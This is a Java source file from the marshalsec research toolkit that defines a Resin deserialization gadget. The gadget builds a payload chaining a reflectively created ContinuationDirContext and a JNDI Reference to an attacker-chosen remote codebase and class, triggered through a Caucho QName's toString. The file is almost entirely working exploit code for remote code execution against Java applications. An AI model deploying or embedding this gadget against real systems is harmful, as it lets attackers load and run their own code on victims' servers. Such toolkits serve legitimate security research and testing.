/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import java.lang.reflect.Constructor;
import java.util.Hashtable;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;

import com.caucho.naming.QName;

import marshalsec.MarshallerBase;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;


/**
 * @author mbechler
 *
 */
public interface Resin extends Gadget {

    @Args ( minArgs = 2, args = {
        "codebase", "class"
    }, defaultArgs = {
        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
    } )
    default Object makeResinQName ( UtilFactory uf, String[] args ) throws Exception {

        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        Reflections.setFieldValue(cpe, "cause", null);
        Reflections.setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(new Reference("Foo", args[ 1 ], args[ 0 ]));

        Reflections.setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "foo", "bar");
        return uf.makeToStringTriggerStable(qName);
    }
}
